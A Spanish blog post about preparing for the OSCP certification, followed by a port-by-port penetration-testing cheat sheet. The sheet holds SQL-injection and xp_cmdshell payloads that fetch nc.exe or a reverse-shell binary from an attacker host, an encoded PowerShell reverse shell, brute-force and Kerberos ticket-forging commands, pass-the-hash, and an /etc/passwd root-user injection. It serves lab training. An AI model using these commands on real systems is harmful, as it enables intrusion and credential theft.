# Mi Camino hacia la Certificación OSCP en Seguridad Ofensiva

Permíteme compartir contigo mi emocionante viaje hacia la obtención de la codiciada certificación en seguridad ofensiva, OSCP. Aunque intentaré ser conciso, quiero brindarte una visión completa de mi experiencia y cómo llegué a alcanzar este logro.

Si estás adentrándote en este mundo y todos estos términos son nuevos para ti, te recomiendo encarecidamente que te sumerjas en dos recursos valiosos que me ayudaron enormemente a lo largo de mi camino. Los siguientes enlaces te proporcionarán una comprensión sólida de lo que se necesita para conquistar la certificación OSCP:

- [Guía de Preparación de TJnull](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html): Comenzar con la guía preparada por TJnull te dará una visión detallada y completa de cómo enfrentar el desafío OSCP.

- [Recursos de Johnjhacking:](https://johnjhacking.com/blog/oscp-reborn-2023/) Johnjhacking también ha compartido sus conocimientos y experiencia sobre la certificación OSCP en su blog.

Además, en este [documento compartido](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) encontrarás una lista de máquinas altamente recomendadas para practicar.


Personalmente, inicié mi travesía resolviendo máquinas en la plataforma Hack The Box. A través de videos y writeups de la comunidad, adquirí una base sólida en habilidades de seguridad ofensiva. Esta plataforma no solo es económica, sino que también ofrece una comunidad activa y valiosa. Desde aquí, pude aprender, emular y finalmente enfrentar retos por mi cuenta. A medida que avanzaba, me di cuenta de que consultaba menos los writeups, lo que indicaba mi creciente independencia y conocimiento.

Tomar notas durante este proceso fue fundamental. Esas notas se convierten en tu guía personalizada, una ayuda incalculable cuando te encuentras atascado o necesitas recordar un enfoque particular. A medida que ganaba confianza con Hack The Box, también decidí abordar máquinas en VulnHub. Esto me permitió crear mis propios laboratorios y practicar técnicas de pivoting, todo en preparación para el desafío final: el examen eCPTTv2.

Con más de 150 máquinas resueltas en mi haber (HTB y VulnHub), estaba listo para inscribirme en el temario oficial de la ofensiva OSCP. Mi enfoque en esta etapa fue:

- Resolver los desafíos de la lista de "Proving Grounds Practice" mencionada anteriormente. (30 máquinas más)

- Conseguir los 10 puntos adicionales para el examen asignados por el curso de Offensive. Esto incluye realizar los ejercicios teóricos proporcionados por el curso, así como la participación en el laboratorio correspondientes y realizar los 30 laboratorios.

- Recomiendo completar todas las tareas y entornos proporcionados por la Offensive, prestando especial atención a los laboratorios que simulan el examen real, conocidos como OSCP: A, B y C.

- Lo mejor en mi viaje fue el encuentro con compañeros de estudio comprometidos. Este apoyo resultó ser inmensamente valioso, ya que nos ayudábamos mutuamente.


En resumen, mi camino hacia la certificación OSCP fue un viaje lleno de desafíos, aprendizaje constante y crecimiento personal. Espero que mi experiencia y los recursos que he compartido te inspiren y te brinden la orientación necesaria para conquistar con éxito esta emocionante certificación en seguridad ofensiva. ¡Mucho éxito en tu propio viaje!

## Consejos antes de Enfrentar el Examen:

**Hazte con el AD:** Inicia atacando el Active Directory no es difícil. Los 10 puntos adicionales del curso pueden ser cruciales para aprobar el examen.

**Dominando Windows:** Posteriormente, dirige tu atención hacia las máquinas independientes con sistemas Windows. En mi experiencia, estas máquinas suelen ser más fáciles. Aprovecha lo que aprendiste en el curso de Offensive para resolver las escaladas de privilegios en sistemas Windows.

**Gestión Sabia del Tiempo:** Tu manejo del tiempo es una herramienta esencial. Si te encuentras atascado durante una hora en una dirección sin progresar, considera que podrías haber entrado en una especie de laberinto o "rabbit hole". En tal caso, retrocede y sigue una nueva ruta.

**No Linealidad en los Entornos:** Prepárate para enfrentar entornos no lineales. Puede que tengas que ingresar a recursos compartidos o archivos, obtener credenciales y luego cambiar de usuario para avanzar. La flexibilidad y la creatividad serán tus aliados aquí.

**Persistencia:** Experimentar con credenciales por defecto, como admin:admin.

**Reinicio:** Si obtienes una reverse shell por un puerto y enfrentas dificultades, no dudes en reiniciar la máquina. En mi caso, reiniciar resolvió problemas.

**Un secreto:** LocalPotato es tu amigo. Investiga!


## Últimas Palabras:

Esta certificación, si bien introductoria, marca el comienzo de un camino fascinante. Aquí tienes algunos consejos clave:

- Sumérgete en artículos relacionados: mira vulnerabilidades, sigue guías, foros, blogs y writeups. Los videos también son recursos valiosos.

- Únete a foros y grupos de chat en plataformas como Discord o Telegram, donde puedas aprender y compartir con otros entusiastas.

- Sé proactivo y comprométete en la comunidad. Contribuir es una excelente forma de consolidar tus conocimientos.

 El camino puede ser largo, pero la constancia es clave. Mantén tu determinación mientras avanzas.

La certificación OSCP es solo el punto de partida en un emocionante viaje hacia el mundo de la seguridad ofensiva. ¡Prepárate para abrazar los desafíos y seguir aprendiendo en este apasionante campo!

---

# INDICE
- [RECON](#RECON)
- [ENUMERACION_ACTIVA](#ENUMERACION_ACTIVA)
- [PUERTOS](#PUERTOS)
	- [Port 21 - FTP](#port-21---ftp)
	- [Port 22 - SSH](#port-22---ssh)
	- [Port 23 - Telnet](#port-23---telnet)
	- [Port 25 - SMTP](#port-25---SMTP)
	- [Port 53 - DNS](#port-53---dns)
 	- [Port 80 - HTTP](#Port-80---HTTP)
  	- [Port 88 - Kerberos](#Port-88---Kerberos)
  	- [Port 110 - Pop3](#Port-110---Pop3)
  	- [Port 135 - MSRPC](#Port-135---MSRPC)
  	- [Port 139/445 - SMB](#Port-139445---SMB)
  	- [Port 143/993 - IMAP](#Port-143993---IMAP)
  	- [Port 161/162 - SNMP](#Port-161162---SNMP)
  	- [Port 389/636 - LDAP](#Port-389636---LDAP)
  	- [Port 443 - HTTPS](#Port-443---HTTPS)
  	- [Port 1433 - MSSQL](#Port-1433---MSSQL)
  	- [Port 1521 - Oracle](#Port-1521---Oracle)
  	- [Port 2049 - NFS](#Port-2049---NFS)
  	- [Port 3306 - MySQL](#Port-3306---MySQL)
  	- [Port 3389 - RDP](#Port-3389---RDP)
  	- [Port 5985 - WinRM](#Port-5985---WinRM)
- [ESCALADA DE PRIVILEGIOS](#ESCALADA-DE-PRIVILEGIOS)
  - [Linux](#linux)
  - [Windows](#windows)
  - [AD](#directorio-activo)
- [SHELL](#SHELL)
- [TRANSFERENCIA DE ARCHIVOS](#transferencia-de-archivos) 
  - [Linux](#linux-2)
  - [Windows](#windows-3)
-  [PIVOTING](#pivoting)
-  [EXTRA LINKS](#extra-links)

---

# RECON

## ENUMERACION_ACTIVA
- Nmap

`nmap -sS -p80 $IP`
	
`nmap -sS -p80 $IP`
	    
`nmap -sS -p- -oA ports -v -n -Pn $IP`
	    
`nmap -sU -p- -oA ports -v -n -Pn $IP`
	    
`nmapAutomator.sh 192.168.161.172 All`

* netcat

`nc $IP $PORT`
   
> version
>
> help
> 
> ?

- Telnet

`Telnet $IP $PORT`

> USER $USERNAME
> 
> PASS $PASSWORD

## PUERTOS

### Port 21 - FTP

`ftp $IP $PORT`

`wget -r ftp://user@$IP:$PORT`

`wget -r ftp://$IP --user admin --password admin`

`wget -m -r ftp://anonymous:anonymous@$IP`

`wget -m -r ftp://anonymous:anonymous@$IP --no-passive`

`wget -m ftp://anonymous:anonymous@$IP #Donwload all`

`wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all`

>binary #Set transmission to binary instead of ascii
>
>ascii #Set transmission to ascii instead of binary
>

>ftp> passive
>
>Passive mode: off; fallback to active mode: off
>
>ftp> passive
>
>Passive mode on.

- SFTP

`ftp-ssl $IP`

`sftp $IP`

`ftp-ssl -z secure -z verify=0 -z cipher="$(openssl ciphers -tls1)" -p $IP`

---

### Port 22 - SSH

`ssh user@IP`

`ssh -i id_rsa user@IP`

`sshpass -p 'pass' ssh user@IP`

- restricted bash

`sshpass -p 'P@55W0rd1!2@' ssh user@IP -t bash`

- Bruteforce SSH Service
  
`hydra -u admin -P rockyou.txt ssh://IP`

`crackmapexec ssh -u user -p passwd.lst IP`

- crack id_rsa

`ssh2john id_rsa > hash_id_rsa`

`john -w:/usr/share/wordlists/rockyou.txt hash_id_rsa`

`ssh -i id_rsa user@IP`

- Search SSH Keys files

`find / -name *id_rsa* 2>/dev/null`

---

### Port 23 - Telnet

`telnet $IP `

- Manual scanning

`telnet $IP $PORT`

> VRFY root

---

### Port 25 - SMTP

- smtp-user-enum
 
`smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t $IP`

> The command will look like this. -M for mode. -U for userlist. -t for target

- Brute

`hydra smtp-enum://IP/vrfy -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" 2>&1`

`hydra smtp-enum://IP/expn -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" 2>&1`

---

### Port 53 - DNS

`dnsenum $IP`

`nslookup $IP`

`gobuster dns -d domain.local -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt `

`dig domain.local @IP`

`dig axfr domain.local @IP`

`dig all BLACKFIELD.local @IP`

`dig any htb.local @IP`

`dig axfr htb.local @IP`

`dig +short mx @IP`

`dig +short mx smtp://IP`


> Address of Host (A) = IPv4
> 
> Address of Host (AAAA) = IPv6
> 
> Canonical Name (CNAME) = Alias
> 
> Mail Exchange (MX) = Mail Server. Could be hostname or IP Address.
> 
> Name Server (NS) = Name server for a zone.
> 
> Start of Authority (SOA) = Primary name server for the zone and more information.
> 
> Pointer (PTR) = Used for reverse lookups in DNS.
> 
> Text (TXT) = Extra functionality to DNS and store information.
> 

---

### Port 80 - HTTP

- Checklist
	- [ ] Test default credentials -> admin:admin
	- [ ] Fuzzing
	- [ ] look URL and fuzz /login/1 /login/admin /user/admin ?cmd? or /?whoami
	- [ ] Ctrl+u → view-source: http://IP
	- [ ] Virtual dns-host
	- [ ] Http://10.10.10.10 // not the same as http://virtual.hosting
	- [ ] Add /etc/host
	- [ ] Subdomains
	- [ ] Browse && robots.txt
	- [ ] Headers
	- [ ] Pay attention to errors (Is there any protocol relation)
	- [ ] SQL injection

- Curl 

`curl -X GET http://IP`

`curl -i IP`

`curl -i -L IP`

`curl -i -H "User-Agent:Mozilla/4.0" http://IP`

`curl -X POST http://IP -H 'Content-Length: 0'`

- Fuzzing
  
`whatweb http://IP`

`gobuster dir -u http://IP:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html -r -o gobuster8080.txt`

`feroxbuster -u http://IP -x html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -o fuzzin --silent`

`wfuzz -c -t 400  –hc=404 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt  http://IP/FUZZ`

> try "/" at the end

- Subdomains

`wfuzz -u http://IP -H "Host: FUZZ.IP.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

`gobuster vhost -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://domain.com --append-domain`

- WPScan

`wpscan --url http://IP`

`wpscan --url http://IP --enumerate vp`

`wpscan --url http://IP -e u,ap --plugins-detection aggressive`

>  (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)

---

### Port 88 - Kerberos

- Theory

https://www.tarlogic.com/blog/how-kerberos-works/

https://www.tarlogic.com/blog/how-to-attack-kerberos/

https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/

https://www.poplabsec.com/kerberos-penetration-testing-fundamentals/

> DC=domain,DC=local

- enum user, dictionary attack

`kerbrute userenum --dc $IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100 -o kerburte.txt`

- enum user, with a list obtained

`kerbrute userenum --dc $IP -d domain.local /usr/share/seclists/Usernames/Names/names.txt`

- list user:pasword -> dictionary user:password attack

bruteforce username:password, from file or stdin

`kerbrute passwordspray --dc $IP -d domain.local user:password.txt`
> File **user:password.txt**
> data:

```bash
username:password
username1:password1
username2:password2
username3:password3
```

- test user = pass passwordspray

`kerbrute passwordspray --dc $IP -d domain.local --user-as-pass users.txt`

- test user =/= pass Brute-force

bruteuser Brute-force a single user's password from a list of words

`kerbrute bruteuser --dc $IP -d domain.local users.txt password.txt`


#### Kerberoasting
- Impacket `GetUserSPNs.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP -outputfile Output_TGSs`

- Cracking
	
	- John `john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>`

	- Crack the Tickets `tgsrepcrack.py *.kirbi $WORDLIST`

#### AS-REP Roasting
- Impacket
  - with Credentials `GetNPUsers.py $DOMAIN/$DOMAIN_USER:$PASSWORD -request -outputfile Output_AS_REP_Responses`
  - no Credentials `GetNPUsers.py $DOMAIN/ -usersfile usernames.txt -outputfile Output_AS_REP_Responses`
		
- Cracking
  - Hashcat `hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>`
  - John `john --wordlist=<passwords_file> <AS_REP_responses_file>`

#### Silver Ticket
- Impacket
  - with NTLM `ticketer.py -nthash $NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
  - with aesKey `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
  - Set TGT for impacket use `export KRB5CCNAME=<TGT_ccache_file>`
  - Execute remote commands

`psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`

`smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
   
`wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`

#### Golden Ticket
- Impacket
  - with NTLM `ticketer.py -nthash $KRBTGT_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
  - with aesKey `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
  - Set TGT for impacket use `export KRB5CCNAME=<TGT_ccache_file>`
  - Execute remote commands   

`psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
   
`smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
   
`wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`

#### Clock
> clock setting can be synchronized with → sudo ntpdate $IP

---

### Port 110 - Pop3

`telnet $IP 110`

> USER pelle@$IP
> 
> PASS admin

- List all emails

 > list

- Retrive email number 5, for example

> retr 5

---

### Port 135 - MSRPC

microsoft rpc - remote procedure call

rpcinfo -p IP

- rpcclient; null sesion 

`rpcclient -U "" -N $IP  (null session)`

`rpcclient -U "" -N $IP -c "enumdomusers"`

`rpcclient -U '' -N $IP -c "enumdomusers" | cut -d "[" -f 2 | cut -d "]" -f1 > users`

`rpcclient -U '' -N $IP -c "enumdomgroups" | cut -d "[" -f 2 | cut -d "]" -f1 > users`

`rpcclient -U '' -N $IP -c "querydispinfo"`

- impacket-rpcdump

`impacket-rpcdump -p $IP > rpcdump.txt`

`impacket-rpcdump IP seq 0 2000 | xargs -I {} rpcclient -U '' $IP -N -c 'lookupsids S-1-22-1-{}' | tee sids.txt`

- rpcclient 'user%pass'

`rpcclient -U "user%pass" $IP -c 'enumdomusers'`

`rpcclient -U "user%pass" $IP -c 'querygroupmem 0x200'`

`rpcclient -U "user%pass" $IP -c 'queryuser 0x1f4'`

`rpcclient -U "user%pass" $IP -c 'querydispinfo'`

---

### Port 139/445 - SMB

- Enum hostname


`nmblookup -A $IP`

`nbtscan $IP/30`

`nbtscan -rvh $IP 2>&1`

`enum4linux -a -M -l -d $IP 2>&1`

`nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $IP`

`nmap --script smb-enum-shares -p139,445 -T4 -Pn $IP`

- Get Shares 
```bash
smbmap -H $IP -u null 
smbmap -H $IP -u 'user' -p 'pass' -r 'Path'
smbmap -H $IP -u 'user' -p 'pass' -r 'Path/Path2'
smbmap -H $IP -u 'user' -p 'pass' --download Path/Path2/Desktop/user.txt
```

```bash
smbclient -N -L //$IP
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
smbclient -k domain.local\user:passs@dom.domain.local -dc-ip $IP
smbclient \\\\$IP\\SYSVOL -U "domain.local\user"
```

> - recursive download (smbclient CLI)
>   
> recurse on
> 
> prompt off
> 
> mget *

#### Crackmapexec
```bash
crackmapexec smb $IP -u 'user' -p 'pass'
crackmapexec winrm $IP -u 'user' -p 'pass'
crackmapexec ssh $IP -u 'user' -p 'pass'
crackmapexec ldap $IP -u 'user' -p 'pass' --kdcHost $IP -M laps
crackmapexec mssql -d domain.local -u user -p pass -x "whoami" 
```
```bash
crackmapexec smb $IP -u 'user' -p 'pass' --shares
crackmapexec smb $IP -u 'user' -p 'pass' -M spider_plus --share 'path'
crackmapexec smb $IP -u 'user' -p 'pass' --sam
crackmapexec smb $IP -u 'user' -p 'pass' --lsa
crackmapexec smb $IP -u 'user' -p 'pass' --ntds
crackmapexec smb $IP -u 'user' -p 'pass' --sessions
crackmapexec smb $IP -u 'user' -p 'pass' --users
```
- pass the hash
```bash
crackmapexec smb $IP -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
crackmapexec winrm $IP -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' --ntds vss
```
- bruteforce
```bash
crackmapexec smb $IP -u users.txt -p /usr/share/SecLists/Passwords/darkc0de.txt
crackmapexec smb $IP -u userslist -p passlist --continue-on-success
crackmapexec smb $IP -u userslist -H hashlist --continue-on-success
crackmapexec smb $IP -u userslist -p passlist --continue-on-success --no-bruteforce
crackmapexec smb $IP -u userslist -H hashlist --continue-on-success --no-bruteforce
```

- Enable RDP
 ```bash
crackmapexec smb $IP -u 'user' -H 'hash' -M rdp -o action=enable
```

---

### Port 143/993 - IMAP

`nc $IP 143`

`telnet $IP 143 #Connect to read emails`

`openssl s_client -connect$IP:993 -quiet  #Encrypted connection`

---

### Port 161/162 - SNMP

`sudo nmap -sU --open -p 161 $IP -oG open-snmp.txt`
- SNMP Enumeration Commands
```bash
snmpenum -t $IP
onesixtyone -c names -i hosts
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP
snmpcheck -t $IP -c public
snmp-check $IP -c public|private|community

snmpwalk -Cr1000 -c public -v2c $IP > snmp-full-bullk
snmpwalk -v 1 -c public $IP
snmpwalk -v 2c -c public $IP | tee snmp-full
snmpwalk -v X -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
snmpwalk -c public -v1 $IP 1| grep hrSWRunName|cut -d\* \* -f "**get field**"
```
-SNMPv3 Enumeration

`nmap -sV -p 161 --script=snmp-info $IP/24`

****Enumerating the Entire MIB Tree****

`snmpwalk -c public -v1 -t $IP`

****Enumerating Windows Users****

`snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25`

****Enumerating Running Windows Processes****

`snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2`

****Enumerating Open TCP Ports****

`snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3`

****Enumerating Installed Software****

`snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2`

---

### Port 389/636 - LDAP

`ldapsearch -h $IP -p 389 -x -b "dc=mywebsite,dc=com"`

`ldapsearch -x -h $IP -D 'DOMAIN\user' -w 'hash-password'`

`ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'`

- enum; no user no pass
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" > ldapdump
cat ldapdump | grep -i "samaccountname"
cat ldapdump | grep -i CN=
cat ldapdump | grep -i description
ldapsearch -x -H ldap://10.129.177.112 -p 389 -x -b "DC=domain,DC=local"
```
- enum; user and pass or hass
```bash
ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'hash-password' -b "DC=support,DC=local"
ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'hash-password' -b "DC=support,DC=local" | grep -i "sAMAccountName: support" -B 40
ldapsearch -H ldap://$IP -D cn=support,dc=domain,dc=local -w 'hash-password' -x -b 'dc=domain,dc=local'
ldapsearch -v -c -D user@domain.local -w hash-password -b "DC=support,DC=local" -H ldap://$IP "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
- ldapdomaindump
```bash
ldapdomaindump $IP -u 'DOMAIN\user' -p 'hash-password'
cat ldapdomaindump 
cat ldapdump | grep -i CN= | grep -v "objectCategory:" | grep -v "distinguishedName:" | cut -d "=" -f 2 | cut -d "," -f 1 | sort -u | sed 's/ /./g' > users.txt
crackmapexec ldap $IP -u 'user' -p 'password' -M laps
```

---

### Port 443 - HTTPS

`nmap -sV --script=ssl-heartbleed $IP -p443`

`sslscan https://$IP`

`openssl s_client -connect $IP:443`

---

### Port 1433 - MSSQL

`impacket-mssqlclient domain.local/user:pass@IP`

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

#### xp_cmdshell

- Check if xp_cmdshell is enabled
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
- This turns on advanced options and is needed to configure xp_cmdshell
```
sp_configure 'show advanced options', '1'
RECONFIGURE
```
- This enables xp_cmdshell
```
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```
#### xp_cmdshell one liner
```bash
sp_configure 'Show Advanced Options', '1'; RECONFIGURE; sp_configure 'xp_cmdshell', '1'; RECONFIGURE;
```
#### CLI MSSQL
> MSSQL> xp_cmdshell "whoami"
> 
> MSSQL> xp_cmdshell "ping IP kali"
> 
> MSSQL> xp_cmdshell "curl http://IP/nc.exe -o C:\Temp\nc.exe
> 
> MSSQL> xp_cmdshell "powershell.exe -exec bypass -Command wget http:/IP/nc.exe -Outfile C:\\Windows\\system32\\nc.exe"
> 
> - powershell base64 encode https://www.revshells.com/
> 
> MSSQL> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUGUAYQBtACAAPQAgACQAYwBs...SNIP...bwBzAGUAKAApAA=="


#### from vulnerable panel to SLQinyection
- enabling xp_cmdshell by these set of payloads:

> admin'EXEC sp_configure 'show advanced options',1;-- -
> 
> admin'RECONFIGURE;-- -
> 
> admin'EXEC sp_configure 'xp_cmdshell',1;-- -
> 
> admin'RECONFIGURE;-- -
> 
> admin'EXEC xp_cmdshell 'certutil.exe -urlcache -f http://IP/reverse.exe reverse.exe';-



---

### Port 1521 - Oracle

https://pentestmonkey.net/category/cheat-sheet/sql-injection

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md

`nmap -p 1521 -A $IP`

`nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute`

---

### Port 2049 - NFS

https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
```bash
showmount -e $IP 
mount -t nfs -o ver=2 IP:/home /mnt/
mount IP:/ /tmp/NFS
mount -t IP:/ /tmp/NFS
```

---

### Port 3306 - MySQL

https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

https://devhints.io/mysql

mysql -u root -p'root' -h $IP -P 3306

> select version();
> 
> select system_user();
> 
> show databases;
> 
> use mysql;
> 
> describe mysql;
> 
> SELECT user, authentication_string FROM mysql.user WHERE user = 'admin';

 - Check list manual sqli

- [ ] 1' order by 100 #
- [ ] 1'or sleep(5)#
- [ ] admin' or 1=1-- -
- [ ] admin' or sleep(5)-- -
- [ ] admin or sleep(5)-- -
- [ ] admin' and sleep(5)-- -
- [ ] admin and sleep(5)-- -
- [ ] admin' or sleep(5)#
- [ ] admin' and sleep(5)# 
- [ ] test@test.com' or 1=1-- -
- [ ] ' or 0=0 --
- [ ] ' or 0=0 #
- [ ] ' or 0=0 #"
- [ ] ' or '1'='1'--
- [ ] ' or 1 --'
- [ ] ' or 1=1--
- [ ] ' or 1=1 or ''='
- [ ] ' or 1=1 or ""=
- [ ] ' or a=a--
- [ ] ' or a=a
- [ ] ') or ('a'='a
- [ ] 'hi' or 'x'='x';

#### Union Based SQL Injection
> check # or -- -
> first check error based panel login; admin' or 1=1-- - then
```bash
admin' or 1=1#
admin' ORDER BY 10#
admin' UNION SELECT version(),2#
admin' UNION SELECT version(),database()#
admin' UNION SELECT version(),user()#
admin' UNION SELECT IF(1=1, SLEEP(5), null)-- -
admin' UNION ALL SELECT table_name,2 from information_schema.tables#
admin' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#
admin' UNION ALL SELECT concat(user,char(58),password),2 from users#
```


```bash
admin' or 1=1-- -
1' or 1 = 1 -- -
1' order by 100 -- -
1' order by 4 -- - 
1' union select 1,2,3,4-- -
1' union select 1,2,3-- -
1' union select 1,NULL,3-- -
1' union select 1,test,3-- - 
1' union select 1,database(),3-- -
1' union select 1,version(),3-- -
1' union select 1,schema_name,3 from information_schema.schemata -- -
1' union select 1,schema_name,3 from information_schema.schemata limit 0,1-- -
1' union select 1,schema_name,3 from information_schema.schemata limit 1,1-- -
1' union select 1,schema_name,3 from information_schema.schemata limit 2,1-- -
1' union select 1,schema_name,3 from information_schema.schemata limit 3,1-- -
1' union select 1,table_name,3 from information_schema.tables-- -
1' union select 1,table_name,3 from information_schema.tables where table_schema="table" -- -
1' union select 1,column_name,3 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
```
- load files from SMB share on my Kali

`1' union select 1,load_file("\\\\10.10.10.10\smbFolder"),3-- -.`

in order to grab a NTLM version 2 hash

`impacket-smbserver smbFolder $(pwd) -smb2support`

> then crack the hash or pass the hash

#### SQLITE3

https://vhernando.github.io/sqlite3-cheat-sheet

> - Show all tables
>   
> sqlite> .tables
> 
> - List all databases and their associated files:
>   
> sqlite> .databases
> 
> - Show contents of a table:
>   
> sqlite> select * from CLIENTS;

> - Execute an UNIX command:
>   
> sqlite>.system ls -l



---

### Port 3389 - RDP

- Connecting to RDP 
`remmina &`

`xfreerdp /u:user /p:password /v:IP`

https://www.poplabsec.com/rdp-penetration-testing/

https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp

- Enumerating RDP

`nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" IP -p3389`

- Brute Force RDP
  
`hydra -L userslist.txt -P wordlist.txt 192.168.1.131 rdp`

---

### Port 5985 - WinRM

- verify
  
`crackmapexec winrm $IP`

`crackmapexec winrm $IP -u 'user' -H 'hash'`

`evil-winrm -i $IP -u 'user' -H 'hash'`

`evil-winrm -i $IP -S -c legacyy_dev_auth.crt -k legacyy_dev_auth_decrypted.key`

#### EVIL-WINRM

- upload

> Evil-WinRM* PS C:\Users\User\Desktop> upload /home/kali/file
- Download
  
>  Evil-WinRM* PS C:\Users\User\Desktop> download SAM (or SYSTEM)
- menu
  
> Evil-WinRM* PS C:\Users\Users\Desktop> menu
- [x] Bypass-4MSI
- [x] services
- [x] upload
- [x] download

> Evil-WinRM* PS C:\Users\Users\Desktop> Bypass-4MSI

---

## ESCALADA DE PRIVILEGIOS

### LINUX

- Manual Enumeration
- [ ] id

- [ ] Critical groups: lxd, docker, sudo, adm, staff

- [ ] Lxd, docker —> exploits (Exploit-DB, Hacktricks…)

- [ ] File Grupo adm —> find /group adm 2>/dev/null

- [ ] Kernel —> uname -a

- [ ] Cron —> crontab -l ; cat /etc/crontab ; cat /var/spool/cron/crontabs

- [ ] SUID —> find / -perm -4000 2>/dev/null

- [ ] sudo —> sudo -l

- [ ] env

- [ ] capabilities —> getcap -r / 2>/dev/null

- [ ] Enum: /media /mnt y /opt

- [ ] Enum: BBDD

- [ ] Enum: /var/www (web)

- [ ] id_rsa —> find / -name id_rsa 2>/dev/null
 
- [ ] processes  —> ps aux

- [ ] Users —> cat /etc/passwd

- [ ] cat .bashrc

- [ ] Net —>  ifconfig

- linpeas.sh
- pspy.64

```bash
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
ind / -perm -u=s -type f 2>/dev/null
find /home -printf “%f\t%p\t%u\t%g\t%m\n” 2>/dev/null | column -t
find / -perm -4000 2>/dev/null
find / -perm -777 -type f 2>/dev/null
find / perm /u=s -user 'whoami' 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin “password” *.*
findstr /spin “password” *.*
```
- $PATH

`echo $PATH`

`export PATH=/tmp:$PATH`

- binaries 

https://gtfobins.github.io/

- Inspecting Service Footprints

`watch -n 1 "ps -aux | grep pass`

`sudo tcpdump -i lo -A | grep "pass"`

- Abusing Cron Jobs

`crontab -l`

`cat /etc/crontab`

- Abusing /etc/passwd

`openssl passwd w00t (Fdzt.eqJQ4s0g)`

`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`

root2:w00t

- Capabilities

`/usr/sbin/getcap -r / 2>/dev/null`

https://gtfobins.github.io/#+capabilities

- Abusing Sudo

`sudo -l`

- Exploiting Kernel Vulnerabilities

`cat /etc/issue`

`uname -a`

---

### WINDOWS

- Manual Enumeration
```bash
Username and hostname

Group memberships of the current user

Existing users and groups

Operating system, version and architecture

Network information

Installed applications

Running processes
```


- [ ] whoami /all
- [ ] whoami /priv
- [ ] whoami /groups
- [ ] systeminfo
- [ ] cmdkey /list
- [ ] net use
- [ ] net users
- [ ] net user user1
- [ ] net localgroup
